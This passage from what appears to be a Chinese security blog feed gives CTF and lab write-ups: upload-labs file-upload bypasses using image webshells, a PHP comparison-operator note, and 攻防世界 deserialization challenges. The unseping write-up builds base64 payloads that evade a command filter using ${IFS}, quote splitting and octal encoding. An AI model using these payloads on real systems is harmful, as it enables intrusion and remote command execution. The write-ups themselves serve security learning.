class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$strInfo</span> = @<span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    <br>    <span class="hljs-variable">$typeCode</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    <br>    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;        <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;<br>        &#125;    <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_type</span> = <span class="hljs-title function_ invoke__">getReailFileType</span>(<span class="hljs-variable">$temp_file</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> == <span class="hljs-string">&#x27;unknown&#x27;</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_type</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>有的文件上传，上传时候会检测头文件，不同的文件，头文件也不尽相同。常见<br>的文件上传图片头检测 它检测图片是两个字节的长度，如果不是图片的格式，<br>会禁止上传。<br>常见的文件头<br>JPEG (jpg)，文件头：FFD8FF<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D</p><p>制作图片一句话，使用 copy 1.gif&#x2F;b+moon.php shell.php 将 php 文件附加再 jpg，图片上，直接上传即可。<br><img src="/img/upload-labs-5.png" srcset="/img/loading.gif" lazyload><br>这个文件是jpg的，所以需要利用文件包含漏洞</p><p>或者直接添加文件头GIF89a</p><h3 id="图片检测绕过-labs-14"><a href="#图片检测绕过-labs-14" class="headerlink" title="图片检测绕过(labs-14)"></a><strong>图片检测绕过(labs-14)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$filename</span>);<span class="hljs-comment">//getimagesize 是获取图片的大小，如果头文件不是图片会报错直接可以用图片马</span><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">image_type_to_extension</span>(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>getimagesize 是获取图片的大小，如果头文件不是图片会报错直接可以用图片马同上</strong></p><h3 id="绕过图片二次渲染攻击-labs-16"><a href="#绕过图片二次渲染攻击-labs-16" class="headerlink" title="绕过图片二次渲染攻击(labs-16)"></a><strong>绕过图片二次渲染攻击(labs-16)</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">image_type_to_extension</span>(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);<span class="hljs-comment">//只允许上传 JPG PNG gif 在源码中使用 imagecreatefromgif 函数对图片进行二次生成。生成的图片保存在，upload 目录下。</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>有些图片上传，会对上传的图片进行二次渲染后在保存，体积可能会更小，图片会模糊一些，但是符合网站的需求。例如新闻图片封面等可能需要二次渲染，因为原图片占用的体积更大。访问的人数太多时候会占用，很大带宽。二次渲染后的图片内容会减少，如果里面包含后门代码，可能会被省略。导致上传的图片马，恶意代码被清除。<br><img src="/img/upload-labs6.png" srcset="/img/loading.gif" lazyload><br>这里利用文件包含即可利用</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php运算符号</title>
    <link href="/2023/05/21/php%E8%BF%90%E7%AE%97%E7%AC%A6%E5%8F%B7/"/>
    <url>/2023/05/21/php%E8%BF%90%E7%AE%97%E7%AC%A6%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<h3 id="php运算符’-x3D-x3D-‘，’-x3D-x3D-x3D-‘"><a href="#php运算符’-x3D-x3D-‘，’-x3D-x3D-x3D-‘" class="headerlink" title="php运算符’&#x3D;&#x3D;‘，’&#x3D;&#x3D;&#x3D;‘"></a>php运算符’&#x3D;&#x3D;‘，’&#x3D;&#x3D;&#x3D;‘</h3><p>1、&#x3D;&#x3D;&#x3D;：<br>三个符号称为等同符，当等号两边值为相同类型的时候，直接比较等号两边的值，值相同返回true,若等号两边类型不同直接返回false例如<br>100&#x3D;&#x3D;&#x3D;”100”  &#x2F;&#x2F;返回fales<br>abc&#x3D;&#x3D;&#x3D;”abc” &#x2F;&#x2F;返回false<br>‘abc’&#x3D;”abc”  &#x2F;&#x2F;返回true<br>NAN&#x3D;&#x3D;&#x3D;NAN  &#x2F;返回false<br>false&#x3D;&#x3D;&#x3D;false  &#x2F;&#x2F;返回true</p><p>2、&#x3D;&#x3D;：<br>两个等号称为等值符，当等号两边的值为相同类型时比较值是否相同，类型不同时会发生类型的自动转换，转换为相同的类型后再作比较</p><p>类型转换规则：<br>（1）：如果等号两边是bolean、string、number三者中任意两者进行比较时，优先转换为数字进行比较<br>&#x2F;*（2）：如果等号两边出现了null和undefined、null和undefined除了和自己相等，就彼此相等<br>100&#x3D;&#x3D;”100”  &#x2F;&#x2F;返回true<br>1&#x3D;&#x3D;true    &#x2F;&#x2F;返回true<br>“1”&#x3D;&#x3D;”01”  &#x2F;&#x2F;返回false，类型已经相同了直接比较值<br>NaN&#x3D;&#x3D;NaN  &#x2F;&#x2F;返回false，NaN和所有值包括自己都不相等 *&#x2F;这一段有点疑惑</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>serialize攻防世界</title>
    <link href="/2023/05/17/serialize%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    <url>/2023/05/17/serialize%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="serialize3攻防世界"><a href="#serialize3攻防世界" class="headerlink" title="serialize3攻防世界"></a><strong>serialize3攻防世界</strong></h1><p><img src="/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize31.png" srcset="/img/loading.gif" lazyload><br>这个题首先观察发现?code，猜测是我们需要控制变量名$flag且控制变量值为111</p><p><img src="/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize32.png" srcset="/img/loading.gif" lazyload></p><p>进行攻击载荷构造 O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}<br>将变量个数1改为2可以绕过wakeup函数</p><p><img src="/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserialize33.png" srcset="/img/loading.gif" lazyload></p><p>成功攻击</p><h1 id="unseping攻防世界"><a href="#unseping攻防世界" class="headerlink" title="unseping攻防世界"></a><strong>unseping攻防世界</strong></h1><h3 id="直接上源码"><a href="#直接上源码" class="headerlink" title="直接上源码"></a>直接上源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;method, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;ping&quot;</span>))) &#123;<span class="hljs-comment">//在$this-&gt;method里面找ping这个值</span><br>            <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$this</span>-&gt;method), <span class="hljs-variable language_">$this</span>-&gt;args);<span class="hljs-comment">//调用ping函数 $this-&gt;method是要执行的命令</span><br>        &#125;<br>    &#125; <br> <span class="hljs-comment">/*可以看看chatgpt的分析</span><br><span class="hljs-comment">在这个特定的 __destruct() 方法中，有一个条件语句。它检查 $this-&gt;method 是否在一个包含字符串 &quot;ping&quot; 的数组中（array(&quot;ping&quot;)）。如果 $this-&gt;method 是 &quot;ping&quot;，则执行 call_user_func_array() 函数。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">call_user_func_array() 函数用于调用一个回调函数，并传递一个参数数组。在这个例子中，回调函数是 $this-&gt;method 所代表的方法，并且参数数组是 $this-&gt;args。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">简而言之，当一个对象被销毁时，如果 $this-&gt;method 的值是 &quot;ping&quot;，则会调用相应的方法，并传递 $this-&gt;args 作为参数*/</span><br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$result</span>);<span class="hljs-comment">//exec函数用来执行系统命令</span><br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$pat_array</span>)) &#123;<span class="hljs-comment">//过滤这里要进行绕过</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;don&#x27;t hack&quot;</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable language_">$this</span>-&gt;args <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;args[<span class="hljs-variable">$k</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$v</span>);<span class="hljs-comment">//传值 不懂可以参考下https://www.php.cn/php-ask-491652.html</span><br>        &#125;<br>    &#125;   <br>&#125;<br><br><span class="hljs-variable">$ctf</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ctf</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="简单分析后开始构造payload"><a href="#简单分析后开始构造payload" class="headerlink" title="简单分析后开始构造payload"></a>简单分析后开始构造payload</h3><p>我们可以通过wat()和ping()得到提示应该是执行系统命令，该系统是linux</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ease</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;<br>    &#125;&#125;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ls&#x27;</span>));<br>    <span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到payload ：O:4:”ease”:2:{s:12:”easemethod”;s:4:”ping”;s:10:”easeargs”;a:1:{i:0;s:2:”ls”;}}<br>base64编码后为：Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyOiJscyI7fX0&#x3D;<br>查看返回值<br><img src="/img/unseping1.png" srcset="/img/loading.gif" lazyload><br>这说明ls被过滤了</p><h3 id="二次构造payload-用空环境变量绕过"><a href="#二次构造payload-用空环境变量绕过" class="headerlink" title="二次构造payload 用空环境变量绕过"></a>二次构造payload 用空环境变量绕过</h3><p>使用空环境变量绕过<br>1.”“双引号<br>2.‘’单引号（在这里不行）<br>3’${Z}<br>二次构造ls之间增加””即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l&quot;&quot;s&#x27;</span>));<br></code></pre></td></tr></table></figure><p>post提交base64编码Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo0OiJsIiJzIjt9fQ&#x3D;&#x3D;<img src="/img/unseping2.png" srcset="/img/loading.gif" lazyload><br>发现flag_1s_here文件</p><h3 id="三次构造payload"><a href="#三次构造payload" class="headerlink" title="三次构造payload"></a>三次构造payload</h3><p>这里我们需要执行的命令是ls flag_1s_here<br>这个空应该使用什么绕过呢参考其他师傅的题解了解到，${IFS}可以用来替代空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l&quot;&quot;s$&#123;IFS&#125;fl&quot;&quot;ag_1s_here&#x27;</span>));<br></code></pre></td></tr></table></figure><p>post提交base64编码<br>Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoyNDoibCIicyR7SUZTfWZsIiJhZ18xc19oZXJlIjt9fQ&#x3D;&#x3D;<br><img src="/img/unsping3.png" srcset="/img/loading.gif" lazyload><br>发现文件flag_831b69012c67b35f.php</p><h3 id="四次构造payload-OTC命令执行"><a href="#四次构造payload-OTC命令执行" class="headerlink" title="四次构造payload OTC命令执行"></a>四次构造payload OTC命令执行</h3><p>这里需要我们继续构造payload查看文件，正常来说我们的命令是<br>cat flag_1s_here&#x2F;flag_831b69012c67b35f.php<br>cd flag_1s_here;cat flag_831b69012c67b35f.php<br>cd flag_1s_here&amp;&amp;cat flag_831b69012c67b35f.php<br>但是发现都有字符被过滤且不好绕过<br>这里参考师傅们的web发现需要编写脚本对命令进行八进制转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 字符串转8进制</span><br>str_1 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要转换的字符串:&quot;</span>)<br>str_8 = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> str_1:<br>    str_8 += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">oct</span>(<span class="hljs-built_in">ord</span>(s))).replace(<span class="hljs-string">&quot;0o&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>)<br><span class="hljs-built_in">print</span>(str_8)<br><br><br></code></pre></td></tr></table></figure><p>结果为\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160<br>执行的方法为<br><img src="/img/unsping5.jpg" srcset="/img/loading.gif" 